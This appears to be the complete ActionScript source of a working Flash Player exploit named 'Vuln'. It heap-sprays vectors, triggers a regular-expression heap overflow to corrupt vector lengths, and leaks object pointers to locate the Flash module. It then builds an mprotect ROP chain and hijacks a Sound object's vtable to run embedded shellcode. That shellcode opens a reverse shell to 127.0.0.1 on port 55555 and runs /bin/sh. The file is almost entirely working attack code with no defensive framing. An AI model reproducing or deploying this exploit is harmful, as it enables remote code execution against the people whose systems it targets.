package {

    import __AS3__.vec.*;
    import flash.display.*;
    import flash.media.*;
    import flash.net.*;
    import flash.system.*;
    import flash.text.*;
    import flash.utils.*;

    public class Vuln extends flash.display.Sprite {

        public function UintToDouble(arg1:uint, arg2:uint):Number
        {
            var loc1:*=new flash.utils.ByteArray();
            loc1.endian = flash.utils.Endian.LITTLE_ENDIAN;
            loc1.writeInt(arg1);
            loc1.writeInt(arg2);
            loc1.position = 0;
            return loc1.readDouble();
        }
 
        public function ReadDouble(arg1:__AS3__.vec.Vector.<Number>, arg2:uint):__AS3__.vec.Vector.<uint>
        {
            new Vector.<uint>(2)[0] = 0;
            new Vector.<uint>(2)[1] = 0;
            var loc1:*=new Vector.<uint>(2);
            var loc2:*=arg1[arg2];
            var loc3:*;
            (loc3 = new flash.utils.ByteArray()).position = 0;
            loc3.writeDouble(loc2);
            loc1[1] = loc3[0] * 16777216 + loc3[1] * 65536 + loc3[2] * 256 + loc3[3];
            loc1[0] = loc3[4] * 16777216 + loc3[5] * 65536 + loc3[6] * 256 + loc3[7];
            return loc1;
        }

        public function randRange(arg1:Number, arg2:Number):Number
        {
            var loc1:*=Math.floor(Math.random() * (arg2 - arg1 + 1)) + arg1;
            return loc1;
        }

        public function Vuln(){

            var shellcode:* = "\x6a\x66\x58\x99\x52\x42\x52\x89\xd3\x42\x52\x89\xe1\xcd\x80\x93\x89\xd1\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x66\x87\xda\x68\x7f\x00\x00\x01\x66\x68\xd9\x03\x66\x53\x43\x89\xe1\x6a\x10\x51\x52\x89\xe1\xcd\x80\x6a\x0b\x58\x99\x89\xd1\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";

            var dispTxt:TextField = new TextField();
            dispTxt.text = "Start.";
            addChild(dispTxt);

            var ex:* = "(?i)()()(?-i)||||||||||||||||||||||";

            var c:* = 0;
            var d:* = 0;
            var s:* = "";

            var corrObj:* = 0;
            var corrIdx:* = 0;

            var eSound:* = new Sound();
            var spray:* = new Vector.<Object>(0);
            var eBarry:* = new ByteArray();

            while(d<42){
                s = s + String.fromCharCode(this.randRange(97,122));
                ++d;
            }

            // spray objects, vectors, numbers
            while(c<0x4000){
                spray[c] = new Vector.<Object>(16);
                spray[c][0] = new RegExp(s,"");
                spray[c][1] = new Vector.<Number>(16);
                spray[c][1][0] = 0;
                spray[c][1][1] = 0;
                spray[c][1][2] = 0;
                spray[c][1][3] = 0;
                spray[c][1][4] = 0;
                spray[c][1][5] = 0;
                spray[c][1][6] = 0;
                spray[c][1][7] = 0;
                spray[c][1][8] = 0;
                spray[c][1][9] = 0;
                spray[c][1][10] = 0;
                spray[c][1][11] = 0;
                spray[c][1][12] = 0;
                spray[c][1][13] = 0;
                spray[c][1][14] = 0;
                spray[c][1][15] = 1;
                spray[c][2] = new Vector.<Number>(16);
                spray[c][2][0] = 0;
                spray[c][2][1] = 0;
                spray[c][2][2] = 0;
                spray[c][2][3] = 0;
                spray[c][2][4] = 0;
                spray[c][2][5] = 0;
                spray[c][2][6] = 0;
                spray[c][2][7] = 0;
                spray[c][2][8] = 0;
                spray[c][2][9] = 0;
                spray[c][2][10] = 0;
                spray[c][2][11] = 0;
                spray[c][2][12] = 0;
                spray[c][2][13] = 0;
                spray[c][2][14] = 0;
                spray[c][2][15] = 1;
                spray[c][3] = new Vector.<Number>(16);
                spray[c][3][0] = 0;
                spray[c][3][1] = 0;
                spray[c][3][2] = 0;
                spray[c][3][3] = 0;
                spray[c][3][4] = 0;
                spray[c][3][5] = 0;
                spray[c][3][6] = 0;
                spray[c][3][7] = 0;
                spray[c][3][8] = 0;
                spray[c][3][9] = 0;
                spray[c][3][10] = 0;
                spray[c][3][11] = 0;
                spray[c][3][12] = 0;
                spray[c][3][13] = 0;
                spray[c][3][14] = 0;
                spray[c][3][15] = 1;
                spray[c][4] = new Vector.<Number>(16);
                spray[c][4][0] = 0;
                spray[c][4][1] = 0;
                spray[c][4][2] = 0;
                spray[c][4][3] = 0;
                spray[c][4][4] = 0;
                spray[c][4][5] = 0;
                spray[c][4][6] = 0;
                spray[c][4][7] = 0;
                spray[c][4][8] = 0;
                spray[c][4][9] = 0;
                spray[c][4][10] = 0;
                spray[c][4][11] = 0;
                spray[c][4][12] = 0;
                spray[c][4][13] = 0;
                spray[c][4][14] = 0;
                spray[c][4][15] = 1;
                spray[c][5] = new Vector.<Number>(16);
                spray[c][5][0] = 0;
                spray[c][5][1] = 0;
                spray[c][5][2] = 0;
                spray[c][5][3] = 0;
                spray[c][5][4] = 0;
                spray[c][5][5] = 0;
                spray[c][5][6] = 0;
                spray[c][5][7] = 0;
                spray[c][5][8] = 0;
                spray[c][5][9] = 0;
                spray[c][5][10] = 0;
                spray[c][5][11] = 0;
                spray[c][5][12] = 0;
                spray[c][5][13] = 0;
                spray[c][5][14] = 0;
                spray[c][5][15] = 1;
                spray[c][6] = new Vector.<Number>(16);
                spray[c][6][0] = 0;
                spray[c][6][1] = 0;
                spray[c][6][2] = 0;
                spray[c][6][3] = 0;
                spray[c][6][4] = 0;
                spray[c][6][5] = 0;
                spray[c][6][6] = 0;
                spray[c][6][7] = 0;
                spray[c][6][8] = 0;
                spray[c][6][9] = 0;
                spray[c][6][10] = 0;
                spray[c][6][11] = 0;
                spray[c][6][12] = 0;
                spray[c][6][13] = 0;
                spray[c][6][14] = 0;
                spray[c][6][15] = 1;
                spray[c][7] = new Vector.<Number>(16);
                spray[c][7][0] = 0;
                spray[c][7][1] = 0;
                spray[c][7][2] = 0;
                spray[c][7][3] = 0;
                spray[c][7][4] = 0;
                spray[c][7][5] = 0;
                spray[c][7][6] = 0;
                spray[c][7][7] = 0;
                spray[c][7][8] = 0;
                spray[c][7][9] = 0;
                spray[c][7][10] = 0;
                spray[c][7][11] = 0;
                spray[c][7][12] = 0;
                spray[c][7][13] = 0;
                spray[c][7][14] = 0;
                spray[c][7][15] = 1;
                spray[c][8] = new Vector.<Number>(16);
                spray[c][8][0] = 0;
                spray[c][8][1] = 0;
                spray[c][8][2] = 0;
                spray[c][8][3] = 0;
                spray[c][8][4] = 0;
                spray[c][8][5] = 0;
                spray[c][8][6] = 0;
                spray[c][8][7] = 0;
                spray[c][8][8] = 0;
                spray[c][8][9] = 0;
                spray[c][8][10] = 0;
                spray[c][8][11] = 0;
                spray[c][8][12] = 0;
                spray[c][8][13] = 0;
                spray[c][8][14] = 0;
                spray[c][8][15] = 1;
                spray[c][9] = new Vector.<Object>(32);
                spray[c][9][0] = null;
                spray[c][9][1] = eSound;
                spray[c][9][2] = eBarry;
                spray[c][9][3] = eBarry;
                spray[c][9][4] = eBarry;
                spray[c][9][5] = eBarry;
                spray[c][9][6] = eBarry;
                spray[c][9][7] = eBarry;
                spray[c][9][8] = eBarry;
                spray[c][9][9] = eBarry;
                spray[c][9][10] = eBarry;
                spray[c][9][11] = eBarry;
                spray[c][9][12] = eBarry;
                spray[c][9][13] = eBarry;
                spray[c][9][14] = eBarry;
                spray[c][9][15] = eBarry;
                spray[c][9][16] = eBarry;
                spray[c][9][17] = eBarry;
                spray[c][9][18] = eBarry;
                spray[c][9][19] = eBarry;
                spray[c][9][20] = eBarry;
                spray[c][9][21] = eBarry;
                spray[c][9][22] = eBarry;
                spray[c][9][23] = eBarry;
                spray[c][9][24] = eBarry;
                spray[c][9][25] = eBarry;
                spray[c][9][26] = eBarry;
                spray[c][9][27] = eBarry;
                spray[c][9][28] = eBarry;
                spray[c][9][29] = eBarry;
                spray[c][9][30] = eBarry;
                spray[c][9][31] = eBarry;
                spray[c][10] = new Vector.<Object>(32);
                spray[c][10][0] = null;
                spray[c][10][1] = eSound;
                spray[c][10][2] = eBarry;
                spray[c][10][3] = eBarry;
                spray[c][10][4] = eBarry;
                spray[c][10][5] = eBarry;
                spray[c][10][6] = eBarry;
                spray[c][10][7] = eBarry;
                spray[c][10][8] = eBarry;
                spray[c][10][9] = eBarry;
                spray[c][10][10] = eBarry;
                spray[c][10][11] = eBarry;
                spray[c][10][12] = eBarry;
                spray[c][10][13] = eBarry;
                spray[c][10][14] = eBarry;
                spray[c][10][15] = eBarry;
                spray[c][10][16] = eBarry;
                spray[c][10][17] = eBarry;
                spray[c][10][18] = eBarry;
                spray[c][10][19] = eBarry;
                spray[c][10][20] = eBarry;
                spray[c][10][21] = eBarry;
                spray[c][10][22] = eBarry;
                spray[c][10][23] = eBarry;
                spray[c][10][24] = eBarry;
                spray[c][10][25] = eBarry;
                spray[c][10][26] = eBarry;
                spray[c][10][27] = eBarry;
                spray[c][10][28] = eBarry;
                spray[c][10][29] = eBarry;
                spray[c][10][30] = eBarry;
                spray[c][10][31] = eBarry;
                spray[c][11] = new Vector.<Object>(32);
                spray[c][11][0] = null;
                spray[c][11][1] = eSound;
                spray[c][11][2] = eBarry;
                spray[c][11][3] = eBarry;
                spray[c][11][4] = eBarry;
                spray[c][11][5] = eBarry;
                spray[c][11][6] = eBarry;
                spray[c][11][7] = eBarry;
                spray[c][11][8] = eBarry;
                spray[c][11][9] = eBarry;
                spray[c][11][10] = eBarry;
                spray[c][11][11] = eBarry;
                spray[c][11][12] = eBarry;
                spray[c][11][13] = eBarry;
                spray[c][11][14] = eBarry;
                spray[c][11][15] = eBarry;
                spray[c][11][16] = eBarry;
                spray[c][11][17] = eBarry;
                spray[c][11][18] = eBarry;
                spray[c][11][19] = eBarry;
                spray[c][11][20] = eBarry;
                spray[c][11][21] = eBarry;
                spray[c][11][22] = eBarry;
                spray[c][11][23] = eBarry;
                spray[c][11][24] = eBarry;
                spray[c][11][25] = eBarry;
                spray[c][11][26] = eBarry;
                spray[c][11][27] = eBarry;
                spray[c][11][28] = eBarry;
                spray[c][11][29] = eBarry;
                spray[c][11][30] = eBarry;
                spray[c][11][31] = eBarry;
                spray[c][12] = new Vector.<Object>(32);
                spray[c][12][0] = null;
                spray[c][12][1] = eSound;
                spray[c][12][2] = eBarry;
                spray[c][12][3] = eBarry;
                spray[c][12][4] = eBarry;
                spray[c][12][5] = eBarry;
                spray[c][12][6] = eBarry;
                spray[c][12][7] = eBarry;
                spray[c][12][8] = eBarry;
                spray[c][12][9] = eBarry;
                spray[c][12][10] = eBarry;
                spray[c][12][11] = eBarry;
                spray[c][12][12] = eBarry;
                spray[c][12][13] = eBarry;
                spray[c][12][14] = eBarry;
                spray[c][12][15] = eBarry;
                spray[c][12][16] = eBarry;
                spray[c][12][17] = eBarry;
                spray[c][12][18] = eBarry;
                spray[c][12][19] = eBarry;
                spray[c][12][20] = eBarry;
                spray[c][12][21] = eBarry;
                spray[c][12][22] = eBarry;
                spray[c][12][23] = eBarry;
                spray[c][12][24] = eBarry;
                spray[c][12][25] = eBarry;
                spray[c][12][26] = eBarry;
                spray[c][12][27] = eBarry;
                spray[c][12][28] = eBarry;
                spray[c][12][29] = eBarry;
                spray[c][12][30] = eBarry;
                spray[c][12][31] = eBarry;
                spray[c][13] = new Vector.<Object>(32);
                spray[c][13][0] = null;
                spray[c][13][1] = eSound;
                spray[c][13][2] = eBarry;
                spray[c][13][3] = eBarry;
                spray[c][13][4] = eBarry;
                spray[c][13][5] = eBarry;
                spray[c][13][6] = eBarry;
                spray[c][13][7] = eBarry;
                spray[c][13][8] = eBarry;
                spray[c][13][9] = eBarry;
                spray[c][13][10] = eBarry;
                spray[c][13][11] = eBarry;
                spray[c][13][12] = eBarry;
                spray[c][13][13] = eBarry;
                spray[c][13][14] = eBarry;
                spray[c][13][15] = eBarry;
                spray[c][13][16] = eBarry;
                spray[c][13][17] = eBarry;
                spray[c][13][18] = eBarry;
                spray[c][13][19] = eBarry;
                spray[c][13][20] = eBarry;
                spray[c][13][21] = eBarry;
                spray[c][13][22] = eBarry;
                spray[c][13][23] = eBarry;
                spray[c][13][24] = eBarry;
                spray[c][13][25] = eBarry;
                spray[c][13][26] = eBarry;
                spray[c][13][27] = eBarry;
                spray[c][13][28] = eBarry;
                spray[c][13][29] = eBarry;
                spray[c][13][30] = eBarry;
                spray[c][13][31] = eBarry;
                spray[c][14] = new Vector.<Object>(32);
                spray[c][14][0] = null;
                spray[c][14][1] = eSound;
                spray[c][14][2] = eBarry;
                spray[c][14][3] = eBarry;
                spray[c][14][4] = eBarry;
                spray[c][14][5] = eBarry;
                spray[c][14][6] = eBarry;
                spray[c][14][7] = eBarry;
                spray[c][14][8] = eBarry;
                spray[c][14][9] = eBarry;
                spray[c][14][10] = eBarry;
                spray[c][14][11] = eBarry;
                spray[c][14][12] = eBarry;
                spray[c][14][13] = eBarry;
                spray[c][14][14] = eBarry;
                spray[c][14][15] = eBarry;
                spray[c][14][16] = eBarry;
                spray[c][14][17] = eBarry;
                spray[c][14][18] = eBarry;
                spray[c][14][19] = eBarry;
                spray[c][14][20] = eBarry;
                spray[c][14][21] = eBarry;
                spray[c][14][22] = eBarry;
                spray[c][14][23] = eBarry;
                spray[c][14][24] = eBarry;
                spray[c][14][25] = eBarry;
                spray[c][14][26] = eBarry;
                spray[c][14][27] = eBarry;
                spray[c][14][28] = eBarry;
                spray[c][14][29] = eBarry;
                spray[c][14][30] = eBarry;
                spray[c][14][31] = eBarry;
                spray[c][15] = new Vector.<Object>(32);
                spray[c][15][0] = null;
                spray[c][15][1] = eSound;
                spray[c][15][2] = eBarry;
                spray[c][15][3] = eBarry;
                spray[c][15][4] = eBarry;
                spray[c][15][5] = eBarry;
                spray[c][15][6] = eBarry;
                spray[c][15][7] = eBarry;
                spray[c][15][8] = eBarry;
                spray[c][15][9] = eBarry;
                spray[c][15][10] = eBarry;
                spray[c][15][11] = eBarry;
                spray[c][15][12] = eBarry;
                spray[c][15][13] = eBarry;
                spray[c][15][14] = eBarry;
                spray[c][15][15] = eBarry;
                spray[c][15][16] = eBarry;
                spray[c][15][17] = eBarry;
                spray[c][15][18] = eBarry;
                spray[c][15][19] = eBarry;
                spray[c][15][20] = eBarry;
                spray[c][15][21] = eBarry;
                spray[c][15][22] = eBarry;
                spray[c][15][23] = eBarry;
                spray[c][15][24] = eBarry;
                spray[c][15][25] = eBarry;
                spray[c][15][26] = eBarry;
                spray[c][15][27] = eBarry;
                spray[c][15][28] = eBarry;
                spray[c][15][29] = eBarry;
                spray[c][15][30] = eBarry;
                spray[c][15][31] = eBarry;
                c++;
            }


            // set the hole of the allocated memory
            c = 0x2012
            while(c<0x4000-1){
                if(c%2 != 0){
                    spray[c][2] = null;
                }
                c++;
            }
            

            // trigger the heap overflow
            var re1:* = new RegExp(ex, "");


            // get the corrupted Vector.<Number>
            c=0x2012;
            while(c<0x4000-1){
                d=1;
                if(c%2 != 0){ while(d<=8){
                    try{ if((spray[c][d] as Vector.<Number>).length>17){
                        corrObj = c;
                        corrIdx = d;
                        c=0x8000;
                        break;
                    }}
                    catch(e:Error){
                    }
                    d++;
                }}
                c++;
            }
            if(c<0x8000-1){
                while(1){
                }
            }

            // corrupt another vector for controlling whole memory 
            if(this.ReadDouble((spray[corrObj][corrIdx] as Vector.<Number>), 17)[0] != 0x10){
                while(1){
                }
            }
            var tmp1:* = 0;
            tmp1 = this.ReadDouble((spray[corrObj][corrIdx] as Vector.<Number>), 17)[1];
            (spray[corrObj][corrIdx] as Vector.<Number>)[17] = this.UintToDouble(0xffffffff, tmp1);
            (spray[corrObj][corrIdx] as Vector.<Number>)[18] = this.UintToDouble(0x41424342, 0);

            // get the corrupted vector
            c=0;
            while(c<0x4000-1){
                d=1;
                while(d<=8){
                    try{
                        if(this.ReadDouble((spray[c][d] as Vector.<Number>), 0)[0] == 0x41424342){
                            corrObj = c;
                            corrIdx = d;
                            c = 0x8000;
                            break;
                        }
                    }
                    catch(e:Error){
                    }
                    d++;
                }
                c++;
            }
            if(c<0x8000-1){
                while(1){
                }
            }

            // recover original size of corrupted vector
            (spray[corrObj][corrIdx] as Vector.<Number>)[0x1fffffed] = this.UintToDouble(0x10,tmp1);


            // get Sound()'s ptr and ByteArray()'s ptr
            var SoundPtr:* = 0;
            var BarryPtr:* = 0;
            c=0;
            while(c<0x1000){
                if(this.ReadDouble((spray[corrObj][corrIdx] as Vector.<Number>), c)[1] == 0x20 &&
                    this.ReadDouble((spray[corrObj][corrIdx] as Vector.<Number>), c+1)[0] == 0x01){
                    SoundPtr = this.ReadDouble((spray[corrObj][corrIdx] as Vector.<Number>), c+1)[1];
                    BarryPtr = this.ReadDouble((spray[corrObj][corrIdx] as Vector.<Number>), c+2)[0];
                    break;
                }
                c++;
            }
            if(c==0x1000){
                while(1){
                }
            }
            SoundPtr = SoundPtr & 0xfffffff8;
            BarryPtr = BarryPtr & 0xfffffff8;

            // free all Vector.<Number>
            for(c=0;c<0x4000;c++){ for(d=1;d<9;d++){
                if(c!=corrObj || d!=corrIdx){
                    spray[c][d] = null;
                }   
            }}

            // get the corrupted vector's address
            var cBase:* = 0;
            c = this.ReadDouble((spray[corrObj][corrIdx] as Vector.<Number>), 17)[0];
            (spray[corrObj][corrIdx] as Vector.<Number>)[3] = this.UintToDouble(SoundPtr, BarryPtr);
            cBase = c-(0x90*2)+8;

            for(c=0;c<0x400*0x64;c++){
                eBarry.writeUnsignedInt(0x41414141);
            }

            // get the payload's address
            var offset:* = 0;
            var scAddr:* = 0;
            offset = ((BarryPtr+0x30)-cBase)/8;
            scAddr = this.ReadDouble((spray[corrObj][corrIdx] as Vector.<Number>), offset)[1];
            scAddr += eBarry.position;
            (spray[corrObj][corrIdx] as Vector.<Number>)[4] = this.UintToDouble(offset, scAddr);

            // get the Sound()'s vtable
            var vtSound:* = 0;
            var flBase:* = 0;
            offset = ((SoundPtr)-cBase)/8;
            vtSound = this.ReadDouble((spray[corrObj][corrIdx] as Vector.<Number>), offset)[0];
            (spray[corrObj][corrIdx] as Vector.<Number>)[5] = this.UintToDouble(offset, vtSound);
            flBase = vtSound - 0xf8e588;
            (spray[corrObj][corrIdx] as Vector.<Number>)[6] = this.UintToDouble(flBase, flBase);

            // TODO: Write Payload

            // set up for easy payload
            var xchgaxdx:* = 0xf20e9e;
            var xchgaxsp:* = 0x9f19c3;
            var popret:* = 0xf5abaa;
            eBarry.endian = flash.utils.Endian.LITTLE_ENDIAN
            eBarry.writeUnsignedInt(flBase+xchgaxsp);
            for(c=0;c<0x1c;c++){
                eBarry.writeUnsignedInt(flBase+popret+1);
            }
            eBarry.writeUnsignedInt(flBase+popret);
            eBarry.writeUnsignedInt(flBase+xchgaxdx);

            // now we can start exploit!
            var mprotect:*  = 0x102c4;
            var pppr:*      = 0xd4c0c0;
            var jmpesp:*    = 0xf655eb;
            eBarry.writeUnsignedInt(flBase+mprotect);
            eBarry.writeUnsignedInt(flBase+pppr);
            eBarry.writeUnsignedInt(scAddr & 0xfffff000);
            eBarry.writeUnsignedInt(0x2000);
            eBarry.writeUnsignedInt(7);
            eBarry.writeUnsignedInt(flBase+jmpesp);
            for(c=0;c<0x100;c++){
                eBarry.writeByte(0x90);
            }
            for(c=0;c<shellcode.length;c++){
                eBarry.writeByte(shellcode.charCodeAt(c));
            }

            // Get EIP!!!
            if(SoundPtr-cBase > 0){
                offset = ((SoundPtr)-cBase)/8;
            }
            else{
                offset = ((0x100000000-cBase) + SoundPtr)/8;
            }
            tmp1 = this.ReadDouble((spray[corrObj][corrIdx] as Vector.<Number>), offset)[1];
            (spray[corrObj][corrIdx] as Vector.<Number>)[offset] = this.UintToDouble(scAddr, tmp1);
            new Number(eSound.toString());

            dispTxt.text="Done.";

            while(1){
            }
        }
    }
}
